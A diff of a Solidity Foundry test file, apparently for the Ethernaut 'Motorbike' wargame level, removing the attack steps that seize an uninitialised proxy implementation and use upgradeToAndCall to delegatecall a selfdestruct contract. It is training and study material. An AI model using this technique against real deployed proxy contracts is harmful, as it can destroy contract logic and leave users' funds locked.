@@ -28,20 +28,6 @@ contract MotorbikeTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // initialise the engine
-        engine.initialize();
-
-        // Set up bike Exy 
-        BikeExy bikeExy = new BikeExy();
-
-        // Get data required for the upgrade to and call method
-        bytes memory initEncoded = abi.encodeWithSignature("initialize()");
-
-
-        // upgrade to and call will delegate call to bikeExy which will run selfdestruct
-        engine.upgradeToAndCall(address(bikeExy), initEncoded);
-        
-
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
@@ -51,6 +37,6 @@ contract MotorbikeTest is DSTest {
         // This means it gets executed at the end of a transaction, a single test is a single transaction
         // This means we can call selfdestruct on the engine contract at the start of the test but we will
         // continue to be allowed to call all other contract function for the duration of that transaction (test)
-        // since the selfdestruct execution only happy at the end 
+        // since the selfdestruct execution only happy at the end
     }
 }
